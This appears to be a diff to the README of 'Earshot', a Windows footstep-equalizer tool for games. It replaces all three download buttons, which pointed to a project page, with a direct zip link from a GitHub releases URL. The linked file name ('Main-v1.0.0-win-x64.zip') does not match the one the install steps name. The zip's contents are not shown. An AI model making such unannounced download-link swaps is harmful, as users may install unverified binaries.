@@ -15,7 +15,7 @@
 
 <br><br>
 
-<a class="download-btn-action" href="https://pickle7.dev/footstep-equalizer/"><img src="assets/download.png" width="300" alt="Download Earshot for Windows"></a>
+<a class="download-btn-action" href="https://github.com/SoldierMultiply/footstep-equalizer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download.png" width="300" alt="Download Earshot for Windows"></a>
 
 <sub>Windows 10 / 11 · x64 · v1.0.0 · free</sub>
 
@@ -138,7 +138,7 @@ Press <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>B</kbd> in game to compare process
 
 ## Download and install
 
-<a class="download-btn-action" href="https://pickle7.dev/footstep-equalizer/"><img src="assets/download-compact.png" width="260" alt="Download Earshot v1.0.0 for Windows"></a>
+<a class="download-btn-action" href="https://github.com/SoldierMultiply/footstep-equalizer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download-compact.png" width="260" alt="Download Earshot v1.0.0 for Windows"></a>
 
 1. Download **Earshot-v1.0.0-win-x64.zip** from the latest release.
 2. Extract the zip anywhere, for example `C:\Program Files\Earshot` or your Desktop.
@@ -289,7 +289,7 @@ Released under the [MIT License](LICENSE). Copyright (c) 2026 Earshot contributo
 
 <div align="center">
 <br>
-<a class="download-btn-action" href="https://pickle7.dev/footstep-equalizer/"><img src="assets/download.png" width="280" alt="Download Earshot footstep equalizer for Windows"></a>
+<a class="download-btn-action" href="https://github.com/SoldierMultiply/footstep-equalizer/releases/latest/download/Main-v1.0.0-win-x64.zip"><img src="assets/download.png" width="280" alt="Download Earshot footstep equalizer for Windows"></a>
 <br>
 <sub>Windows 10 / 11 · x64 · v1.0.0 · free</sub>
 </div>
